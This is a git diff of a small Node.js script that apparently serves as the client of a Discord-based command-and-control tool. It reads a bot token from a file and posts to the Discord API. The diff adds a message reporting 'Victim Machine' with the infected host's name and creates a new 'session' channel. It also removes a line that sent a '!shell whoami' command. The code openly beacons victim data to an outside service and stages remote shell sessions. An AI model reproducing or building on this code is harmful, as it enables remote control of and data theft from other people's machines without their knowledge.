@@ -1,7 +1,7 @@
 const os = require('os');
 const fs = require('fs');
 
-const CHANNEL_ID = '1163727185358618665';
+const CHANNEL_ID = '<id>';
 
 async function main() {
   const token = fs
@@ -14,17 +14,16 @@ async function main() {
   };
 
   const data = {
-      //content: `Victim Machine: ${os.hostname()}`,
-      content: `!shell whoami`,
+    content: `Victim Machine: ${os.hostname()}`,
   };
 
   try {
     const response = await fetch(
-      `https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`,
+      `https://discord.com/api/v9/guilds/<id>/channels`,
       {
         method: 'POST',
         headers,
-        body: JSON.stringify(data),
+        body: JSON.stringify({"name": "session-1", "type": 0}),
       }
     );
 
